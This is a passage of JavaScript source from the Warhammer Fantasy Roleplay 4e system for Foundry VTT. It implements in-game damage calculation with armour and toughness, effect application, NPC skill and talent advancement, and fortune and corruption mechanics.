    let attacker = opposedTest.attacker;
    let soundContext = { item: {}, action: "hit" };

    // Start wound loss at the damage value
    let totalWoundLoss = opposedTest.result.damage.value;
    let newWounds = actor.status.wounds.value;
    let applyAP = (damageType == game.wfrp4e.config.DAMAGE_TYPE.IGNORE_TB || damageType == game.wfrp4e.config.DAMAGE_TYPE.NORMAL);
    let applyTB = (damageType == game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP || damageType == game.wfrp4e.config.DAMAGE_TYPE.NORMAL);
    let AP = foundry.utils.deepClone(actor.status.armour[opposedTest.result.hitloc.value]);
    let ward = actor.status.ward.value;
    let wardRoll = Math.ceil(CONFIG.Dice.randomUniform() * 10);
    let abort = false;

    // Start message update string
    let updateMsg = `<b>${game.i18n.localize("CHAT.DamageApplied")}</b><span class = 'hide-option'>: `;
    let messageElements = []; // unused and deprecated

    let modifiers = {
      tb : 0,
      ap : {
        value : 0,
        used : 0,
        ignored : 0,
        metal : 0, // Not used here, but convenient for scripts
        nonmetal : 0, // Not used here, but convenient for scripts
        magical : 0, // Not used here, but convenient for scripts
        shield : 0,
        details : []
      },
      other : [], // array of {label : string, value : number, details : string},
      minimumOne : false // whether minimumOne was triggered (used for the tooltip)
    };
    let extraMessages = [];

    let weaponProperties = opposedTest.attackerTest.item?.properties || {};
    // If weapon is undamaging
    let undamaging = false;
    // If weapon has Hack
    let hack = false;
    // If weapon has Impale
    let impale = false;
    // If weapon has Penetrating
    let penetrating = false;

    let zzap = false;

    let args = { actor, attacker, opposedTest, damageType, weaponProperties, applyAP, applyTB, totalWoundLoss, AP, modifiers, extraMessages, ward, wardRoll, abort};
    await Promise.all(actor.runScripts("preTakeDamage", args));
    await Promise.all(attacker.runScripts("preApplyDamage", args));
    await Promise.all(opposedTest.attackerTest.item?.runScripts("preApplyDamage", args));
    damageType = args.damageType;
    applyAP = args.applyAP; 
    applyTB = args.applyTB;
    ward = args.ward;
    abort = args.abort;
    totalWoundLoss = args.totalWoundLoss;

    if (abort)
    {
      return `${abort}`
    }

    let vehicleTBTooltip = "";
    // Reduce damage by TB
    if (applyTB) 
    {
      if (this.type == "vehicle" && attacker.type != "vehicle" && opposedTest.attackerTest.item?.system.isMelee)
      {
        let tbModifier = game.wfrp4e.config.vehicleActorSizeComparison[this.system.details.size.value][attacker.system.details.size.value];

        if (tbModifier > 0)
        {
          modifiers.tb += actor.characteristics.t.bonus * tbModifier;
          vehicleTBTooltip = game.i18n.format("CHAT.VehicleTBTooltipMultiply", {number : tbModifier});
        }
        else if(tbModifier < 0)
        {
          vehicleTBTooltip = game.i18n.format("CHAT.VehicleTBTooltipSubtract", {number : Math.abs(tbModifier)});
          modifiers.tb += actor.characteristics.t.bonus + tbModifier;
        }
        else return game.i18n.localize("CHAT.AttackerTooSmallDamage")
      }
      else 
      {
        modifiers.tb += actor.characteristics.t.bonus;
      }
    }

    // Determine its qualities/flaws to be used for damage calculation
    penetrating = weaponProperties?.qualities?.penetrating;
    undamaging = weaponProperties?.flaws?.undamaging && !opposedTest.result.damaging;
    hack = weaponProperties?.qualities?.hack;
    impale = weaponProperties?.qualities?.impale;
    weaponProperties?.qualities?.pummel;
    zzap = weaponProperties?.qualities?.zzap;
    
    // see if armor flaws should be triggered
    let ignorePartial = opposedTest.attackerTest.result.roll % 2 == 0 || opposedTest.attackerTest.result.critical;
    let ignoreWeakpoints = opposedTest.attackerTest.result.critical && impale;
    let zzapIgnored = zzap ? 1 : 0; // start zzap out at 1;

    // Mitigate damage with armor one layer at a time
    for (let layer of AP.layers) {
      modifiers.ap.value += layer.value;
      zzapIgnored = zzap ? 1 : 0; // start zzap out at 1

      if (ignoreWeakpoints && layer.weakpoints) {
        modifiers.ap.details.push(game.i18n.format("BREAKDOWN.Weakpoints", {ignored: layer.value, item: layer.source.name}));
        modifiers.ap.ignored += layer.value;
        layer.ignored = true;
      }
      else if (ignorePartial && layer.partial) {
        modifiers.ap.details.push(game.i18n.format("BREAKDOWN.Partial", {ignored: layer.value, item: layer.source.name}));
        modifiers.ap.ignored += layer.value;
        layer.ignored = true;
      }
      else if (zzap && layer.metal) // ignore 1 AP and all metal AP 
      {
          zzapIgnored += layer.value;
          layer.ignored = true;
      }
      else if (penetrating && layer.source?.type == "armour") // If penetrating - ignore 1 or all armor depending on material
      {
        if (!game.settings.get("wfrp4e", "mooPenetrating"))
        {
          let penetratingIgnored = layer.metal ? 1 : layer.value;
          modifiers.ap.details.push(game.i18n.format("BREAKDOWN.Penetrating", {ignored: penetratingIgnored, item: layer.source.name}));
          modifiers.ap.ignored += penetratingIgnored;
          if (layer.metal)
          {
            modifiers.ap.metal += layer.value - 1;
            if (layer.magical)
            {
              modifiers.ap.magical += layer.value - 1;
            }
          }
          else 
          {
            layer.ignored = true;
          }
        }
      }
      else // If nothing is modifying or ignoring, record AP 
      {
        if (layer.metal)
        {
          modifiers.ap.metal += layer.value;
        }
        else 
        {
          modifiers.ap.nonmetal += layer.value;
        }

        if (layer.magical)
        {
          modifiers.ap.magical += layer.value;
        }
      }
      // if (opposedTest.attackerTest.result.roll % 2 != 0 && layer.impenetrable) {
      //   impenetrable = true;
      //   soundContext.outcome = "impenetrable"
      // }

      // Prioritize plate over chain over leather for sound
      if (layer.value) {
        if (layer.armourType == "plate")
          soundContext.item.armourType = layer.armourType;
        else if (!soundContext.item.armourType || (soundContext.item.armourType && (soundContext.item.armourType.includes("leather")) && layer.armourType == "mail")) // set to chain if there isn't an armour type set yet, or the current armor type is leather
          soundContext.item.armourType = layer.armourType;
        else if (!soundContext.item.armourType)
          soundContext.item.armourType = "leather";
      }
    }

    modifiers.ap.ignored += zzapIgnored;
    if (zzapIgnored)
    {
      modifiers.ap.details.push(game.i18n.format("BREAKDOWN.Zzap", {ignored: zzapIgnored}));
    }

    //@HOUSE
    if (penetrating && game.settings.get("wfrp4e", "mooPenetrating")) {
      game.wfrp4e.utility.logHomebrew("mooPenetrating");
      let penetratingIgnored = penetrating.value || 2;
      modifiers.ap.details.push(game.i18n.format("BREAKDOWN.PenetratingMoo", {ignored: penetratingIgnored}));
      modifiers.ap.ignored += penetratingIgnored;
    }
    //@/HOUSE

    // If using a shield, add that AP as well
    if (game.settings.get("wfrp4e", "uiaShields") && !opposedTest.defenderTest.context.unopposed) // UIA shields don't need to be used, just equipped
    {
      modifiers.ap.shield = this.status.armour.shield;
    }
    else if (opposedTest.defenderTest.weapon) // RAW Shields required the shield to be used
    {
      if (opposedTest.defenderTest.weapon.properties.qualities.shield)
      {
        modifiers.ap.shield = this.status.armour.shield;
      }
    }
    
    //@HOUSE
    if (game.settings.get("wfrp4e", "mooShieldAP") && opposedTest.defenderTest.failed && modifiers.ap.shield) {
      game.wfrp4e.utility.logHomebrew("mooShieldAP");
      modifiers.ap.details.push(game.i18n.format("BREAKDOWN.ShieldMoo", {ignored: modifiers.ap.shield}));
      modifiers.ap.shield = 0;
    }
    //@/HOUSE

    await Promise.all(actor.runScripts("computeTakeDamageModifiers", args));
    await Promise.all(attacker.runScripts("computeApplyDamageModifiers", args));
    await Promise.all(opposedTest.attackerTest.item?.runScripts("computeApplyDamageModifiers", args));

    modifiers.ap.used = Math.max(0, modifiers.ap.value - modifiers.ap.ignored);
    if (undamaging && modifiers.ap.used)
    {
      modifiers.ap.details.push(game.i18n.format("BREAKDOWN.Undamaging", {originalAP: modifiers.ap.used, modifiedAP: modifiers.ap.used * 2}));
      modifiers.ap.used *= 2;
    }

    // Reduce damage done by AP
    if (!applyAP)
    {
      modifiers.ap.used = 0;
      modifiers.ap.shield = 0;
    }
    
    modifiers.total = -modifiers.tb - modifiers.ap.used - modifiers.ap.shield + modifiers.other.reduce((acc, current) => acc + current.value, 0);
    totalWoundLoss += modifiers.total;

    // Minimum 1 wound if not undamaging
    if (!undamaging && totalWoundLoss <= 0)
    {
      args.modifiers.minimumOne = true;
      totalWoundLoss = totalWoundLoss <= 0 ? 1 : totalWoundLoss;
    }
    else
    {
      totalWoundLoss = totalWoundLoss <= 0 ? 0 : totalWoundLoss;
    }

    try {
      if (opposedTest.attackerTest.weapon.attackType == "melee") {
        if ((opposedTest.attackerTest.weapon.Qualities.concat(opposedTest.attackerTest.weapon.Flaws)).every(p => [game.i18n.localize("PROPERTY.Pummel"), game.i18n.localize("PROPERTY.Slow"), game.i18n.localize("PROPERTY.Damaging")].includes(p)))
          soundContext.outcome = "warhammer"; // special sound for warhammer :^)
        else if (AP.used) {
          soundContext.item.type = "armour";
          if (applyAP && totalWoundLoss <= 1)
            soundContext.outcome = "blocked";
          else if (applyAP)
            soundContext.outcome = "normal";
          if (impenetrable)
            soundContext.outcome = "impenetrable";
          if (hack)
            soundContext.outcome = "hack";
        }
        else {
          soundContext.item.type = "hit";
          soundContext.outcome = "normal";
          if (impale || penetrating) {
            soundContext.outcome = "normal_slash";
          }
        }
      }
    }
    catch (e) { WFRP_Utility.log("Sound Context Error: " + e, true); } // Ignore sound errors

    let scriptArgs = { actor, opposedTest, totalWoundLoss, AP, applyAP, applyTB, damageType, updateMsg, messageElements, modifiers, ward, wardRoll, attacker, extraMessages, abort };
    await Promise.all(actor.runScripts("takeDamage", scriptArgs));
    await Promise.all(attacker.runScripts("applyDamage", scriptArgs));
    await Promise.all(opposedTest.attackerTest.item?.runScripts("applyDamage", scriptArgs));
    Hooks.call("wfrp4e:applyDamage", scriptArgs);
    ward = scriptArgs.ward;
    abort = scriptArgs.abort;
    totalWoundLoss = scriptArgs.totalWoundLoss;

    if (abort)
    {
      return `${abort}`
    }

    newWounds -= totalWoundLoss;
    updateMsg += "</span>";
    updateMsg += " " + totalWoundLoss;

    let tooltip = `<p><strong>${game.i18n.localize("Damage")}</strong>: ${opposedTest.result.damage.value}</p><hr>`;

    if (modifiers.tb)
    {
      tooltip += `<p><strong>${game.i18n.localize("TBRed")}</strong>: -${modifiers.tb} ${vehicleTBTooltip ? `(${vehicleTBTooltip})` : ""}</p>`;
    }

    if (!applyTB)
    {
      tooltip += `<p><strong>${game.i18n.localize("TBRed")}</strong>: ${game.i18n.localize("BREAKDOWN.Ignored")}</p>`;
    }

    if (applyAP)
    {
      if (modifiers.ap.used != modifiers.ap.value)
      {
        tooltip += `<p><strong>${game.i18n.localize("AP")}</strong>: -${modifiers.ap.used}`;
        if (modifiers.ap.ignored)
        {
          tooltip += ` (${modifiers.ap.ignored} ${game.i18n.localize("BREAKDOWN.Ignored").toLowerCase()})`;
        }
        tooltip += "</p>";
      }
      else 
      {
        tooltip += `<p><strong>${game.i18n.localize("AP")}</strong>: -${modifiers.ap.used}</p>`;
      }

      if (modifiers.ap.shield)
      {
        tooltip += `<p><strong>${game.i18n.localize("CHAT.DamageShield")}</strong>: -${modifiers.ap.shield}</p>`;
      }

      if (modifiers.ap.details.length)
      {
        tooltip += `<p style='margin-left : 20px'>${modifiers.ap.details.join("</p><p style='margin-left : 20px'>")}</p>`;
      }
    }
    else if (!applyAP)
    {
        tooltip += `<p><strong>${game.i18n.localize("AP")}</strong>: ${game.i18n.localize("BREAKDOWN.Ignored")}</p>`;
    }

    if (modifiers.other.length)
    {
      tooltip += `<p>${modifiers.other.filter(i => i.value != 0).map(i => `<strong>${i.label}</strong>: ${i.details ? i.details : ""} (${(i.value > 0 ? "+" : "") + i.value})`).join("</p><p>")}</p>`;
    }
    if (modifiers.minimumOne)
    {
      tooltip += `<p>${game.i18n.localize("BREAKDOWN.Minimum1")}</p>`;
    }
    tooltip += `<hr><p><strong>${game.i18n.localize("Wounds")}</strong>: ${totalWoundLoss}</p>`;

    updateMsg += ` <a data-tooltip="${tooltip}" style="opacity: 0.5" data-tooltip-direction="LEFT"><i class="fa-solid fa-circle-info"></i></a>`;

    WFRP_Audio.PlayContextAudio(soundContext);

    // If damage taken reduces wounds to 0, show Critical
    if (newWounds <= 0) {
      //WFRP_Audio.PlayContextAudio(opposedTest.attackerTest.weapon, {"type": "hit", "equip": "crit"})
      let critAmnt = game.settings.get("wfrp4e", "uiaCritsMod");
      if (game.settings.get("wfrp4e", "uiaCrits") && critAmnt && (Math.abs(newWounds)) > 0) {
        let critModifier = (Math.abs(newWounds)) * critAmnt;
        updateMsg += `<br><a class ="table-click critical-roll" data-modifier=${critModifier} data-table = "crit${opposedTest.result.hitloc.value}" ><i class='fas fa-list'></i> ${game.i18n.localize("Critical")} +${critModifier}</a>`;
      }
      //@HOUSE
      else if (game.settings.get("wfrp4e", "mooCritModifiers")) {
        game.wfrp4e.utility.logHomebrew("mooCritModifiers");
        let critModifier = (Math.abs(newWounds) - actor.characteristics.t.bonus) * critAmnt;
        if (critModifier)
          updateMsg += `<br><a class ="table-click critical-roll" data-modifier=${critModifier} data-table = "crit${opposedTest.result.hitloc.value}" ><i class='fas fa-list'></i> ${game.i18n.localize("Critical")} ${critModifier > 0 ? "+" + critModifier : critModifier}</a>`;
        else
          updateMsg += `<br><a class ="table-click critical-roll" data-table = "crit${opposedTest.result.hitloc.value}" ><i class='fas fa-list'></i> ${game.i18n.localize("Critical")}</a>`;
      }
      //@/HOUSE
      else if (Math.abs(newWounds) < actor.characteristics.t.bonus && !game.settings.get("wfrp4e", "uiaCrits"))
        updateMsg += `<br><a class ="table-click critical-roll" data-modifier="-20" data-table = "crit${opposedTest.result.hitloc.value}" ><i class='fas fa-list'></i> ${game.i18n.localize("Critical")} (-20)</a>`;
      else
        updateMsg += `<br><a class ="table-click critical-roll" data-table = "crit${opposedTest.result.hitloc.value}" ><i class='fas fa-list'></i> ${game.i18n.localize("Critical")}</a>`;
    }
    if (hack)
    {
      updateMsg += `<br><a class="apply-hack chat-button">${game.i18n.localize('CHAT.ApplyHack')}</a>`;
    }

    if (newWounds <= 0)
      newWounds = 0; // Do not go below 0 wounds


    let item = opposedTest.attackerTest.item;
    if (item?.properties && item?.properties.qualities.slash && updateMsg.includes("critical-roll"))
    {
      updateMsg += `<br>${game.i18n.format("PROPERTY.SlashAlert", {value : parseInt(item?.properties.qualities.slash.value)})}`;
    }

    if (ward > 0) 
    {

      if (wardRoll >= ward) {
        updateMsg = `<span style = "text-decoration: line-through">${updateMsg}</span><br>${game.i18n.format("OPPOSED.Ward", { roll: wardRoll })}`;
        return updateMsg;
      }
      else {
        updateMsg += `<br>${game.i18n.format("OPPOSED.WardRoll", { roll : wardRoll })}`;
      }
    }

    if (extraMessages.length > 0)
    {
      updateMsg += `<p>${extraMessages.join(`</p><p>`)}</p>`;
    }

    if (totalWoundLoss > 0)
    {
      let damageEffects = opposedTest.attackerTest.item?.damageEffects;
      let filtered = [];
      for(let effect of damageEffects)
      {
        if (await effect.runPreApplyScript())
        {
          filtered.push(effect);
        }
      }
      await actor.applyEffect({effectUuids: filtered.map(i => i.uuid), messageId : opposedTest.attackerTest.message.id});
    }

    // Update actor wound value
    actor.update({ "system.status.wounds.value": newWounds });

    return updateMsg;
  }



  /**
   * Unlike applyDamage(), which is for opposed damage calculation, this function just takes a number and damage type and applies the damage.
   * 
   * @param {Number} damage Amount of damage
   * @param {Object} options Type of damage, minimum 1
   */
  async applyBasicDamage(damage, { damageType = game.wfrp4e.config.DAMAGE_TYPE.NORMAL, minimumOne = true, loc = "body", suppressMsg = false, hideDSN=false } = {}) 
  {
    let owningUser = game.wfrp4e.utility.getActiveDocumentOwner(this);

    if (owningUser?.id != game.user.id)
    {
        return game.wfrp4e.socket.executeOnOwnerAndWait(this, "applyDamage", {damage, options : {damageType, minimumOne, loc, suppressMsg, hideDSN}, actorUuid : this.uuid});
    }

    let newWounds = this.status.wounds.value;
    let modifiedDamage = damage;
    let applyAP = (damageType == game.wfrp4e.config.DAMAGE_TYPE.IGNORE_TB || damageType == game.wfrp4e.config.DAMAGE_TYPE.NORMAL);
    let applyTB = (damageType == game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP || damageType == game.wfrp4e.config.DAMAGE_TYPE.NORMAL);
    let msg = game.i18n.format("CHAT.ApplyDamageBasic", { name: this.prototypeToken.name });


    if (loc == "roll")
    {
      loc = (await game.wfrp4e.tables.rollTable("hitloc", {hideDSN})).result;
    }

    if (applyAP) {
      modifiedDamage -= this.status.armour[loc].value;
      msg += ` (${this.status.armour[loc].value} ${game.wfrp4e.config.locations[loc]} ${game.i18n.localize("AP")}`;
      if (!applyTB)
        msg += ")";
      else
        msg += " + ";
    }

    if (applyTB) {
      modifiedDamage -= this.characteristics.t.bonus;
      if (!applyAP)
        msg += " (";
      msg += `${this.characteristics.t.bonus} ${game.i18n.localize("TBRed")})`;
    }

    if (minimumOne && modifiedDamage <= 0)
      modifiedDamage = 1;
    else if (modifiedDamage < 0)
      modifiedDamage = 0;

    msg = msg.replace("@DAMAGE", modifiedDamage);

    newWounds -= modifiedDamage;
    if (newWounds < 0)
      newWounds = 0;
    await this.update({ "system.status.wounds.value": newWounds });

    if (!suppressMsg)
      await ChatMessage.create({ content: msg });
    return msg;
  }


  /**
   * Called by data model update checks
   */
  _displayScrollingChange(change, options = {}) {
    if (!change) return;
    change = Number(change);
    const tokens = this.getActiveTokens();
    for (let t of tokens) {
      canvas.interface?.createScrollingText(t.center, change.signedString(), {
        anchor: (change<0) ? CONST.TEXT_ANCHOR_POINTS.BOTTOM: CONST.TEXT_ANCHOR_POINTS.TOP,
        direction: (change<0) ? 1: 2,
        fontSize: 30,
        fill: options.advantage ? "0x6666FF" : change < 0 ? "0xFF0000" : "0x00FF00", // I regret nothing
        stroke: 0x000000,
        strokeThickness: 4,
        jitter: 0.25
      });
     }
  }


      // Handles applying effects to this actor, ensuring that the owner is the one to do so
    // This allows the owner of the document to roll tests and execute scripts, instead of the applying user
    // e.g. the players can actually test to avoid an effect, instead of the GM doing it
    async applyEffect({effectUuids=[], effectData=[], messageId}={})
    {
        let owningUser = game.wfrp4e.utility.getActiveDocumentOwner(this);

        if (typeof effectUuids == "string")
        {
            effectUuids = [effectUuids];
        }

        if (owningUser?.id == game.user.id)
        {
            for (let uuid of effectUuids)
            {
                let effect = await fromUuid(uuid);
                let message = game.messages.get(messageId);
                await ActiveEffect.implementation.create(effect.convertToApplied(message?.getTest()), {parent: this, message : message?.id});
            }
            for(let data of effectData)
            {
                await ActiveEffect.implementation.create(data, {parent: this, message : messageId});
            }
        }   
        else 
        {
            game.wfrp4e.socket.executeOnOwner(this, "applyEffect", {effectUuids, effectData, actorUuid : this.uuid, messageId});
        }
    }


  /* --------------------------------------------------------------------------------------------------------- */
  /* -------------------------------------- Auto-Advancement Functions --------------------------------------- */
  /* --------------------------------------------------------------------------------------------------------- */
  /**
   * These functions are primarily for NPCs and Creatures and their automatic advancement capabilities. 
   *
  /* --------------------------------------------------------------------------------------------------------- */


  /**
   * Advances an actor's skills based on their species and character creation rules
   * 
    * Per character creation, 3 skills from your species list are advanced by 5, and 3 more are advanced by 3.
    * This functions uses the Foundry Roll class to randomly select skills from the list (defined in config.js)
    * and advance the first 3 selected by 5, and the second 3 selected by 3. This function uses the advanceSkill()
    * helper defined below.
   */
  async _advanceSpeciesSkills() {
    let skillList;

    // A species may not be entered in the actor, so use some error handling.
    try {
      let { skills } = game.wfrp4e.utility.speciesSkillsTalents(this.details.species.value, this.details.species.subspecies);
      skillList = skills;
      if (!skillList) {
        throw game.i18n.localize("ErrorSpeciesSkills") + " " + this.details.species.value;
      }
    }
    catch (error) {
      ui.notifications.info(`${game.i18n.format("ERROR.Species", { name: this.details.species.value })}`);
      WFRP_Utility.log("Could not find species " + this.details.species.value + ": " + error, true);
      throw error
    }
    // The Roll class used to randomly select skills
    let skillSelector = new Roll(`1d${skillList.length}- 1`);
    await skillSelector.roll();

    // Store selected skills
    let skillsSelected = [];
    while (skillsSelected.length < 6) {
      skillSelector = await skillSelector.reroll();
      if (!skillsSelected.includes(skillSelector.total)) // Do not push duplicates
        skillsSelected.push(skillSelector.total);
    }

    // Advance the first 3 by 5, advance the second 3 by 3.
    for (let skillIndex = 0; skillIndex < skillsSelected.length; skillIndex++) {
      if (skillIndex <= 2)
        await this._advanceSkill(skillList[skillsSelected[skillIndex]], 5);
      else
        await this._advanceSkill(skillList[skillsSelected[skillIndex]], 3);
    }
  }


  /**
   * Advances an actor's talents based on their species and character creation rules
   * 
   * Character creation rules for talents state that you get all talents in your species, but there
   * are a few where you must choose between two instead. See config.js for how the species talent 
   * object is set up for support in this. Basically species talents are an array of strings, however
   * ones that offer a choice is formatted as "<talent1>, <talent2>", each talent being a choice. Finally,
   * the last element of the talent list is a number denoting the number of random talents. This function uses
   * the advanceTalent() helper defined below.
   */
  async _advanceSpeciesTalents() {
    // A species may not be entered in the actor, so use some error handling.
    let talentList;
    try {
      let { talents } = game.wfrp4e.utility.speciesSkillsTalents(this.details.species.value, this.details.species.subspecies);
      talentList = talents;
      if (!talentList) {
      }
    }
    catch (error) {
      ui.notifications.info(`${game.i18n.format("ERROR.Species", { name: this.details.species.value })}`);
      WFRP_Utility.log("Could not find species " + this.details.species.value + ": " + error, true);
      throw error
    }
    let talentSelector;
    for (let talent of talentList) {
      if (!isNaN(talent)) // If is a number, roll on random talents
      {
        for (let i = 0; i < talent; i++) {
          let result = await game.wfrp4e.tables.rollTable("talents");
          await this._advanceTalent(result.object.text);
        }
        continue
      }
      // If there is a comma, talent.split() will yield an array of length > 1
      let talentOptions = talent.split(',').map(function (item) {
        return item.trim();
      });

      // Randomly choose a talent option and advance it.
      if (talentOptions.length > 1) {
        talentSelector = await new Roll(`1d${talentOptions.length} - 1`).roll();
        await this._advanceTalent(talentOptions[talentSelector.total]);
      }
      else // If no option, simply advance the talent.
      {
        await this._advanceTalent(talent);
      }
    }

  }


  /**
   * Adds (if needed) and advances a skill by the specified amount.
   * 
   * As the name suggests, this function advances any given skill, if 
   * the actor does not currently have that skill, it will be added 
   * from the compendium and advanced. Note that this function is neither
   * used by manually advancing skills nor when clicking on advancement 
   * indicators. This will simply add the advancement value with no
   * other processing.
   * 
   * @param {String} skillName    Name of the skill to advance/add
   * @param {Number} advances     Advances to add to the skill
   */
  async _advanceSkill(skillName, advances) {
    // Look through items and determine if the actor has the skill
    let existingSkill = this.has(skillName, "skill");
    // If so, simply update the skill with the new advancement value. 
    if (existingSkill) {
      existingSkill = existingSkill.toObject();
      existingSkill.system.advances.value = (existingSkill.system.advances.value < advances) ? advances : existingSkill.system.advances.value;
      await this.updateEmbeddedDocuments("Item", [existingSkill]);
      return;
    }

    // If the actor does not already own skill, search through compendium and add it
    try {
      // See findSkill() for a detailed explanation of how it works
      // Advanced find function, returns the skill the user expects it to return, even with skills not included in the compendium (Lore (whatever))
      let skillToAdd = (await WFRP_Utility.findSkill(skillName)).toObject();
      skillToAdd.system.advances.value = advances;
      await this.createEmbeddedDocuments("Item", [skillToAdd]);
    }
    catch (error) {
      console.error("Something went wrong when adding skill " + skillName + ": " + error);
      ui.notifications.error(game.i18n.format("CAREER.AddSkillError", { skill: skillName, error: error }));
    }
  }

  /**
   * Adds the given talent to the actor
   * 
   * In my implementation, adding a talent is the same as advancing a talent. See
   * prepareTalent() and you'll see that the total number of any given talent is the
   * advencement value.
   * 
   * @param {String} talentName     Name of the talent to add/advance.
   */
  async _advanceTalent(talentName) {
    try {
      // See findTalent() for a detailed explanation of how it works
      // Advanced find function, returns the Talent the user expects it to return, even with Talents not included in the compendium (Etiquette (whatever))
      let talent = await WFRP_Utility.findTalent(talentName);
      await this.createEmbeddedDocuments("Item", [talent.toObject()]);
    }
    catch (error) {
      console.error("Something went wrong when adding talent " + talentName + ": " + error);
      ui.notifications.error(game.i18n.format("CAREER.AddTalentError", { talent: talentName, error: error }));
    }
  }

  /**
   * Advance NPC based on given career
   * 
   * A specialized function used by NPC type Actors that triggers when you click on a 
   * career to be "complete". This takes all the career data and uses it (and the helpers
   * defined above) to advance the actor accordingly. It adds all skills (advanced to the 
   * correct amount to be considered complete), advances all characteristics similarly, and 
   * adds all talents.
   * 
   * Note: This adds *all* skills and talents, which is not necessary to be considered complete.
   * However, I find deleting the ones you don't want to be much easier than trying to pick and 
   * choose the ones you do want.
   *
   * @param {Object} careerData     Career type Item to be used for advancement.
   * 
   */
  async advanceNPC(careerData) {
    let updateObj = {};
    let advancesNeeded = careerData.level.value * 5; // Tier 1 needs 5, 2 needs 10, 3 needs 15, 4 needs 20 in all characteristics and skills

    // Update all necessary characteristics to the advancesNeeded
    for (let advChar of careerData.characteristics)
      if (this.characteristics[advChar].advances < 5 * careerData.level.value)
        updateObj[`data.characteristics.${advChar}.advances`] = 5 * careerData.level.value;

    // Advance all skills in the career
    for (let skill of careerData.skills)
      await this._advanceSkill(skill, advancesNeeded);

    // Add all talents in the career
    for (let talent of careerData.talents)
      await this._advanceTalent(talent);

    this.update(updateObj);
  }


  _replaceData(formula) {
    let dataRgx = new RegExp(/@([a-z.0-9]+)/gi);
    return formula.replace(dataRgx, (match, term) => {
      let value = foundry.utils.getProperty(this, term);
      return value ? String(value).trim() : "0";
    });
  }

  /**
   * Use a fortune point from the actor to reroll or add sl to a roll
   * @param {Object} message 
   * @param {String} type (reroll, addSL)
   */
  useFortuneOnRoll(message, type) {
    if (this.status.fortune.value > 0) {
      let test = message.getTest();
      let html = `<h3 class="center"><b>${game.i18n.localize("FORTUNE.Use")}</b></h3>`;
      //First we send a message to the chat
      if (type == "reroll")
        html += `${game.i18n.format("FORTUNE.UsageRerollText", { character: '<b>' + this.name + '</b>' })}<br>`;
      else
        html += `${game.i18n.format("FORTUNE.UsageAddSLText", { character: '<b>' + this.name + '</b>' })}<br>`;

      html += `<b>${game.i18n.localize("FORTUNE.PointsRemaining")} </b>${this.status.fortune.value - 1}`;
      ChatMessage.create(WFRP_Utility.chatDataSetup(html));

      // let cardOptions = this.preparePostRollAction(message);
      //Then we do the actual fortune action



      if (type == "reroll") {
        test.context.fortuneUsedReroll = true;
        test.context.fortuneUsedAddSL = true;
        test.reroll();

      }
      else //add SL
      {
        test.context.fortuneUsedAddSL = true;
        test.addSL(1);
      }
      this.update({ "system.status.fortune.value": this.status.fortune.value - 1 });
    }
  }

  /**
   * Take a Dark Deal to reroll for +1 Corruption
   * @param {Object} message 
   */
  useDarkDeal(message) {
    let html = `<h3 class="center"><b>${game.i18n.localize("DARKDEAL.Use")}</b></h3>`;
    html += `${game.i18n.format("DARKDEAL.UsageText", { character: '<b>' + this.name + '</b>' })}<br>`;
    let corruption = Math.trunc(this.status.corruption.value) + 1;
    html += `<b>${game.i18n.localize("Corruption")}: </b>${corruption}/${this.status.corruption.max}`;
    ChatMessage.create(WFRP_Utility.chatDataSetup(html));
    this.update({ "system.status.corruption.value": corruption });

    let test = message.getTest();
    test.reroll();
  }

  /**
   * This helper can be used to prepare chatOptions to reroll/edit a test card
   * It uses the informations of the roll located in the message entry
   * from game.messages
   * @param {Object} message 
   * @returns {Object} chatOptions
   */
  preparePostRollAction(message) {
    //recreate the initial (virgin) chatOptions object
    //add a flag for reroll limit
    let data = message.flags.data;
    let chatOptions = {
      flags: { img: message.flags.img },
      rollMode: data.rollMode,
      sound: message.sound,
      speaker: message.speaker,
      template: data.template,
      title: data.title.replace(` - ${game.i18n.localize("Opposed")}`, ""),
      user: message.user
    };
    if (data.attackerMessage)
      chatOptions.attackerMessage = data.attackerMessage;
    if (data.defenderMessage)
      chatOptions.defenderMessage = data.defenderMessage;
    if (data.unopposedStartMessage)
      chatOptions.unopposedStartMessage = data.unopposedStartMessage;
    return chatOptions;
  }


  async corruptionDialog(strength) {
    new Dialog({
      title: game.i18n.localize("DIALOG.CorruptionTitle"),
      content: `<p>${game.i18n.format("DIALOG.CorruptionContent", { name: this.name })}</p>`,
      buttons: {
        endurance: {
          label: game.i18n.localize("NAME.Endurance"),
          callback: () => {
            let skill = this.itemTypes["skill"].find(i => i.name == game.i18n.localize("NAME.Endurance"));
            if (skill) {
              this.setupSkill(skill, { title: game.i18n.format("DIALOG.CorruptionTestTitle", { test: skill.name }), corruption: strength, skipTargets: true }).then(test => test.roll());
            }
            else {
              this.setupCharacteristic("t", { title: game.i18n.format("DIALOG.CorruptionTestTitle", { test: game.wfrp4e.config.characteristics["t"] }), corruption: strength, skipTargets : true }).then(test => test.roll());
            }
          }
        },
        cool: {
          label: game.i18n.localize("NAME.Cool"),
          callback: () => {
            let skill = this.itemTypes["skill"].find(i => i.name == game.i18n.localize("NAME.Cool"));
            if (skill) {
              this.setupSkill(skill, { title: game.i18n.format("DIALOG.CorruptionTestTitle", { test: skill.name }), corruption: strength, skipTargets: true }).then(test => test.roll());
            }
            else {
              this.setupCharacteristic("wp", { title: game.i18n.format("DIALOG.CorruptionTestTitle", { test: game.wfrp4e.config.characteristics["wp"] }), corruption: strength, skipTargets : true }).then(test => test.roll());
            }
          }
        }

      }
    }).render(true);
  }


  has(traitName, type = "trait") {
    return this.itemTypes[type].find(i => i.name == traitName && i.included)
  }


  /**
 * Some effects applied to an actor are actually intended for items, but to make other things convenient
 * (like duration handling modules, or showing the effect icon on the token), they are given to an actor
 * 
 * Also as an unintended benefit it can be used to circumvent items being prepared twice (and thus their effects being applied twice)
 * 
 * @param {Item} item 
 */
  getEffectsApplyingToItem(item) {
    // Get effects that should be applied to item argument
    return this.effects.contents.filter(e => {
      if (e.disabled) {
        return false;
      }

      // An actor effects intended to apply to an item must have the itemTargets flag
      // Empty array => all items
      // No flag => Should not apply to items
      // Array with IDs => Apply only to those IDs
      let targeted = e.getFlag("wfrp4e", "itemTargets");
      if (targeted) {
        if (targeted.length) {
          return targeted.includes(item.id);
        }
        // If no items specified, apply to all items
        else {
          return true;
        }
      }
      else // If no itemTargets flag, it should not apply to items at all
      {
        return false;
      }

      // Create temporary effects that have the item as the parent, so the script context is correct
    }).map(i => new EffectWfrp4e(i.toObject(), { parent: item }));

  }

  /**
   * Same logic as getEffectsApplyingToItem, but reduce the effects to their scripts
   * 
   * @param {Item} item 
